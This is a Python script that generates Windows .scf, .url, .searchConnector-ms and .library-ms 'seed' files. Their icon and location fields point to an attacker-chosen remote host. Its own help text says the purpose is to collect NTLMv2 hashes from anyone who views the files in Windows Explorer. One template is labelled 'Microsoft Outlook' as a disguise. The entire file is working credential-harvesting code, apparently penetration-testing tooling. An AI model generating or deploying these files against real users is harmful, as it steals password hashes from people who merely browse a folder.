#!/usr/bin/env python3

import argparse
import sys

def SeedGen(remotelocation,seedtype):

    if seedtype == "scf":
        content = f'''[Shell]
Command=2
IconFile=\\{remotelocation}\share\pentestlab.ico
[Taskbar]
Command=ToggleDesktop'''
        archivo = open("seed.scf",'w')
        archivo.write(content)
        archivo.close()
    elif seedtype == "url":
        content = f'''[InternetShortcut]
URL=dispenser
WorkingDirectory=dispenser
IconFile=\\\\{remotelocation}\\\\%USERNAME%.icon
IconIndex=1'''
        archivo = open("seed.url",'w')
        archivo.write(content)
        archivo.close()

    elif seedtype == "searchConnector-ms":
        content = f'''<?xml version="1.0" encoding="UTF-8"?>
<searchConnectorDescription xmlns="http://schemas.microsoft.com/windows/2009/searchConnector">
  <iconReference>imageres.dll,-1002</iconReference>
  <description>Microsoft Outlook</description>
  <isSearchOnlyItem>false</isSearchOnlyItem>
  <includeInStartMenuScope>true</includeInStartMenuScope>
  <iconReference>\\\\{remotelocation}\\seed</iconReference>
  <templateInfo><folderType>{{91475FE5-586B-4EBA-8D75-D17434B8CDF6}}</folderType></templateInfo>
  <simpleLocation>
    <url>\\\\{remotelocation}\\seed.ico</url>
  </simpleLocation>
</searchConnectorDescription>'''
        archivo = open("seed.searchConnector-ms",'w')
        archivo.write(content)
        archivo.close()

    elif seedtype == "library-ms":
        content = f'''<?xml version="1.0" encoding="UTF-8"?>
<libraryDescription xmlns="http://schemas.microsoft.com/windows/2009/library">
  <name>@windows.storage.dll,-34582</name>
  <version>6</version>
  <isLibraryPinned>true</isLibraryPinned>
  <iconReference>imageres.dll,-1003</iconReference>
  <templateInfo>    <folderType>{{7d49d726-3c21-4f05-99aa-fdc2c9474656}}</folderType>
  </templateInfo>
  <searchConnectorDescriptionList>
    <searchConnectorDescription>
      <isDefaultSaveLocation>true</isDefaultSaveLocation>
      <isSupported>false</isSupported>
      <simpleLocation>
      <url>\\\\{remotelocation}\\seed</url>
      </simpleLocation>
    </searchConnectorDescription>
  </searchConnectorDescriptionList>
</libraryDescription>'''
        archivo = open("seed.library-ms",'w')
        archivo.write(content)
        archivo.close()
    else:
        print("Please select a valid seed type")
        sys.exit(1)

def main():
    parser = argparse.ArgumentParser(description="Small script that generates a file that when is showed on windows explorer will try to retrieve an icon from a remote conection, its purpose is to collect NTLMv2 hashes. Supported types scf, url, searchConnector-ms and library-ms.")
    parser.add_argument("-rl", "--remotelocation", help="IP where the icon will try to load from.", action="store")
    parser.add_argument("-st", "--seedtype", help="Type of generated file, the ones available are scf, url, searchConnector-ms and library-ms.", action="store")
    args = parser.parse_args()
    print ("Generating seed")
    SeedGen(args.remotelocation,args.seedtype)

if __name__ == '__main__':
    main()